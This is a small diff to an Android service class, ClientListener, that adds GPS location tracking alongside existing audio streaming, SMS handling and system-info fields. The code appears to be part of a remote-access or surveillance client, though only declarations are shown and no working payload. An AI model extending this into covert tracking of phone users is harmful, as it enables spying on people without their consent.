@@ -4,7 +4,9 @@ import android.app.Service;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.location.LocationListener;
 import android.media.AudioRecord;
+import android.media.AudioRecord.OnRecordPositionUpdateListener;
 import android.os.Bundle;
 import android.os.IBinder;
 import android.telephony.SmsMessage;
@@ -15,12 +17,13 @@ import java.util.ArrayList;
 
 import Libreria.AdvancedSystemInfo;
 import Libreria.Audio;
+import Libreria.GPSListener;
 import Libreria.SystemInfo;
 
 /**
  * Created by Vero on 19/05/2015.
  */
-public abstract class ClientListener extends Service implements AudioRecord.OnRecordPositionUpdateListener {
+public abstract class ClientListener extends Service implements OnRecordPositionUpdateListener,LocationListener {
 
     public abstract void handleData(int channel, byte[] data); //
     public abstract void sendInformation(String infos);
@@ -28,6 +31,7 @@ public abstract class ClientListener extends Service implements AudioRecord.OnRe
     public abstract void loadPreferences();
 
     public Audio audioStreamer;
+    public GPSListener gps;
 //  public DirLister dirLister ;
 //  public FileDownloader fileDownloader;
     public SystemInfo infos;
